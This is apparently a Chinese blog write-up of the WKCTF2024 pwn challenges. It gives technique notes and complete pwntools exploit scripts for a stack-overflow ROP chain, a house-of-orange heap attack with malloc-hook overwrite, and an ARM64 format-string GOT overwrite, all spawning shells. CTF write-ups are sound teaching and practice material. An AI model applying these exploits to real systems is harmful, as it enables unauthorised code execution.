---
title: WKCTF2024 WriteUp Pwn
date: 2024-07-14 19:24:45
tags: [CTF, WKCTF2024, WP]
categories: 
    - CTF
    - WKCTF2024
    - Wp
comment: true
---

# babystack
白给一个leak，可以泄露libc地址，存在一个字节的栈溢出，可将rbp最低为置零，输入后第二次leave后rsp有几率指向输入，直接ROP，多跑几次就可以出。

## Exp
```python3
#!/usr/bin/env python3
# Date: 2024-07-14 09:31:36
# Link: https://github.com/RoderickChan/pwncli
# Usage:
#     Debug : python3 exp.py debug elf-file-path -t -b malloc
#     Remote: python3 exp.py remote elf-file-path ip:port

from pwncli import *
cli_script()
set_remote_libc('libc-2.27.so')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
# CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)


rl()
rl()
sl()
sl("19")
ru("Your magic number is: ")
libc_addr=int(rl().strip(),16)
libc.address=libc_addr-0x80b12
sl("256")
ret=libc.address+0x8aa
rdi=libc.address+0x2164f
p=b'a'*152+p64_ex(rdi)+p64_ex(next(libc.search("/bin/sh")))+p64_ex(libc.address+0x2164f)+p64_ex(next(libc.search("/bin/sh")))+p64_ex(ret)+p64_ex(libc.sym['system'])
p=p.ljust(256,b'\x00')
s(p)
print(hex(libc_addr))
ia()

```

# easyheap
- 只有add、edit和show，edit可以溢出任意字节
- house of orange将rop chunk置于unsorted bin，然后通过溢出泄露libc地址
- 通过溢出打unsorted bin attck，在chunk_ptr内写一个main_arena附近的地址
- 通过edit修改top chunk为chunk_ptr并且修复unsorted bin
- 从top chunk中申请堆块，操控chunk_ptr，以获得任意地址写
- 修改malloc hook为calloc+12，calloc hook为one gadgets，触发malloc get shell
{% note success %}
改got发现one gadgets条件都不符合
{% endnote %}
## Exp
```python3
#!/usr/bin/env python3
# Date: 2024-07-14 09:55:48
# Link: https://github.com/RoderickChan/pwncli
# Usage:
#     Debug : python3 exp.py debug elf-file-path -t -b malloc
#     Remote: python3 exp.py remote elf-file-path ip:port

from pwncli import *
cli_script()
set_remote_libc('libc-2.23.so')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
# CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

def cmd(i, prompt=">\n"):
    sla(prompt, i)

def add(size,co):
    cmd('1')
    rl()
    sl(str(size))
    rl()
    s(co)
    #......

def edit(idx,size,co):
    cmd('2')
    rl()
    sl(str(idx))
    rl()
    sl(str(size))
    rl()
    s(co)
    #......

def show(idx):
    cmd('3')
    rl()
    sl(str(idx))
    #......

def dele():
    cmd('4')
    #......


add(0x100,'aaaa')
edit(0,0x110,b'a'*0x108+p64_ex(0xef1))
add(0x1000,'aaaa')
add(0x100,' ')
show(2)
libc_base=u64_ex(r(6).ljust(8,b'\x00'))-0x3c5120
ptr=0x4040E0
top_chunk=libc_base+0x3c4b78
offset=(top_chunk-ptr)//8
edit(2,0x120,b'a'*0x108+p64_ex(0xdc1)+p64_ex(libc_base+0x3c4b78)+p64_ex(0x404100-0x10))
add(0xdb0,p64_ex(libc_base+0x3c4b78)+p64_ex(libc_base+0x3c4b78))
show(4)
heap=u64_ex(r(6).ljust(8,b'\x00'))-0x3c5120
edit(4,32,p64_ex(0x404000)+p64_ex(0)+p64_ex(libc_base+0x3c4b78)*2)
one=libc_base+0x4527a
print(hex(one))
libc=ELF("./libc-2.23.so")
libc.address=libc_base
setcontext=libc.sym['setcontext']
p=flat({0:b'a'*8+p64_ex(libc.sym['puts'])+p64_ex(libc.sym['write'])+p64_ex(libc.sym['__stack_chk_fail'])+p64_ex(libc.sym['read'])+p64_ex(libc.sym['malloc'])+p64_ex(libc.sym['setvbuf'])+p64_ex(libc.sym['__isoc99_scanf'])+p64_ex(libc.sym['exit']),
        0x70:p64_ex(libc.sym['_IO_2_1_stdout_']),
        0x80:p64_ex(libc.sym['_IO_2_1_stdin_']),
        0xa0:p64_ex(0x404120)+p64_ex(one),
        0xd0:p64_ex(libc.sym['__malloc_hook'])+p64_ex(libc.sym['__realloc_hook'])},filler=b'\x00')
add(0xe0,p)

edit(0,8,p64_ex(libc.sym['realloc']+12))
edit(1,8,p64_ex(one))
add(0x20,'aa')
print(hex(libc.sym['__malloc_hook']))
print(hex(ptr))
print(hex(libc_base))
ia()

'''
0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL || {[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...} is a valid argv

0xf03a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL || {[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...} is a valid argv

0xf1247 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
'''
```
# something_changed

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  size_t v4; // x19
  int i; // [xsp+FCCh] [xbp+2Ch]
  char v6[40]; // [xsp+FD0h] [xbp+30h] BYREF
  __int64 v7; // [xsp+FF8h] [xbp+58h]

  v7 = _bss_start;
  read(0, v6, 0x50uLL);
  for ( i = 0; ; ++i )
  {
    v4 = i;
    if ( v4 >= strlen(v6) )
      break;
    if ( (char *)(unsigned __int8)v6[i] == "$" )
      return 0;
  }
  printf(v6);
  return 0;
}
```
ARM64程序，题目说patch了东西，正常来说`$`应该用不了，但是试了下有`$`仍然会执行printf(v6)，直接格式字符串改__stack_chk_fail的got为后门

## Exp
```python3
#!/usr/bin/env python3
# Date: 2024-07-14 12:15:14

from pwn import *
from pwncli import *

context.terminal = ['tmux', 'splitw', '-h']
context.binary = './silent'
context.log_level = 'debug'
context.timeout = 5

io = process(['./qemu-aarch64-static','-L','./libc','-g','1234','silent'])
# io = process(['./qemu-aarch64-static','-L','./libc','silent'])
# io = remote('120.79.91.95', 3332)
elf = ELF('./silent')
# libc = ELF('')


def debug(gdbscript="", stop=False):
    if isinstance(io, process):
        gdb.attach(io, gdbscript=gdbscript)
        if stop:
            pause()

stop = pause
S = pause
leak = lambda name, address: log.info("{} ===> {}".format(name, hex(address)))
s   = io.send
sl  = io.sendline
sla = io.sendlineafter
sa  = io.sendafter
slt = io.sendlinethen
st  = io.sendthen
r   = io.recv
rn  = io.recvn
rr  = io.recvregex
ru  = io.recvuntil
ra  = io.recvall
rl  = io.recvline
rs  = io.recvlines
rls = io.recvline_startswith
rle = io.recvline_endswith
rlc = io.recvline_contains
ia  = io.interactive
ic  = io.close
cr  = io.can_recv

stop()
# debug(stop=True)
payload=b'%p'*7+b"%1656c"+b'%p'*11+b"%hnaaa"+p64_ex(0x411018)
payload=b'%1904c%16$hnaaaa'+p64_ex(0x411018)+b'a'*0x38
# sl(p+p64_ex(0x400770))
s(payload)
ia()

```